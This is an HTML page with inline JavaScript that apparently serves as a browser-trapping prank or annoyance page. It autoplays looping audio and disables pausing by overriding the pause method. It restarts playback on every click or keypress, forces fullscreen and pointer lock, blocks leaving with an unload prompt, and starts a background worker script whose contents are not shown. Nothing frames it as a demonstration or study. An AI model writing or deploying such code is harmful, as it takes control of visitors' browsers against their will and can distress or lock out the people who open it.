<body>
    <audio id="myAudio" src="file.opus" autoplay loop></audio>

    <script>
        const audio = document.getElementById('myAudio');

        audio.pause = function() {
          console.log('Pause blocked')
        }

        function requestPointerLock () {
          const requestPointerLockApi = (
            document.body.requestPointerLock ||
            document.body.webkitRequestPointerLock ||
            document.body.mozRequestPointerLock ||
            document.body.msRequestPointerLock
          )
        
          requestPointerLockApi.call(document.body)
        }
        function requestFullscreen () {
          const requestFullscreen = Element.prototype.requestFullscreen ||
            Element.prototype.webkitRequestFullscreen ||
            Element.prototype.mozRequestFullScreen ||
            Element.prototype.msRequestFullscreen
        
          requestFullscreen.call(document.body)
        }

        function playAudioOnce() {
            if (audio.paused) {
                audio.play().catch(err => {
                    console.log("Error:" + err);
                });
            }
        }

        const events = ['click', 'keypress'];

        events.forEach(event => {
          window.addEventListener(event, playAudioOnce, { once: false });
        });
        window.addEventListener("beforeunload", (event) => {
            event.returnValue = "you sure?";
        });
        audio.addEventListener("playing", () => {
            requestFullscreen()
            requestPointerLock()
            new Worker('worker.js')
        });
        audio.addEventListener('pause', () => {
          playAudioOnce()
        });
    </script>
</body>
